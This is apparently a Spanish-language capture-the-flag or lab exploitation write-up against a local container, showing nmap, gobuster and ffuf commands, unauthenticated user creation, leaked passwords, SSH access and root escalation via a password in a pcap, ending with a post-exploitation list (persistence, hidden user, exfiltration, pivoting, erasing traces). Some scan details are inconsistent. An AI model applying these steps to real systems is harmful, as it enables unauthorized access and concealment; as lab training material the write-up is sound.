# Informe de Explotación

## 1. Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### ✅ Puertos abiertos detectados:

- **22/tcp** → SSH  
- **5000/tcp** → UPnP

---

## 3. Detección de Versiones de Servicios

```bash
nmap -p22,80 -sCV 172.17.0.2
```

### Resultados:

- **22/tcp** → `OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)`
- **5000/tcp** → (sin información precisa en este escaneo)

---

## 4. Enumeración de Directorios vía HTTP

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

### 📂 Rutas encontradas:

- `/add` → `Status: 405` [Size: 178]  
- `/console` → `Status: 400` [Size: 192]

---

## 5. Prueba de Inserción de Usuario

Se intenta realizar un POST a `/add`:

```bash
curl -X POST -d "username=admin&password=123" http://172.17.0.2:5000/add
```

**Respuesta:**
```json
{
  "message": "User added"
}
```

✅ Usuario creado: `admin`  
🔑 Contraseña: `123`

---

## 6. Consulta de Usuarios Existentes

Se accede a la siguiente URL para obtener datos de usuarios:

```bash
http://172.17.0.2:5000/users?username=admin
```

**Respuesta:**

```json
[
  0,
  0,
  3,
  "admin",
  "123"
]
```

---

## 7. Enumeración de Contraseñas con Fuerza Bruta

```bash
ffuf -u http://172.17.0.2:5000/users?username=FUZZ -w /usr/share/wordlists/rockyou.txt -fs 39 -mc 200
```

Se detecta el usuario `pingu` con varias contraseñas:

- `your_password`
- `pinguinasio`

---

## 8. Acceso vía SSH

```bash
ssh pingu@172.17.0.2
```

✅ Acceso SSH exitoso con el usuario `pingu`.

---

## 9. Análisis de Archivos Interesantes

En el directorio base del usuario se encuentran los siguientes archivos:

```
app.py  network.pcap  pingu  users.db
```

Al analizar `network.pcap`, se detecta una contraseña en texto claro:

```
PASS: balulero
```

---

## 10. Escalada de Privilegios

Se utiliza la contraseña `balulero` para obtener acceso como **superusuario** (root).

✅ Acceso root obtenido con éxito.

---

## 11. Post-Explotación

🔒 **Acciones recomendadas:**

- ✅ Establecer persistencia  
- 👤 Crear un usuario oculto  
- 🔐 Añadir clave pública SSH  
- 📂 Exfiltrar información sensible  
- 🌐 Explorar red interna  
- 🔄 Realizar pivoting a otras máquinas  
- 🧹 Eliminar rastros  
- ⚠️ Destrucción del sistema (⚠️ no recomendada)
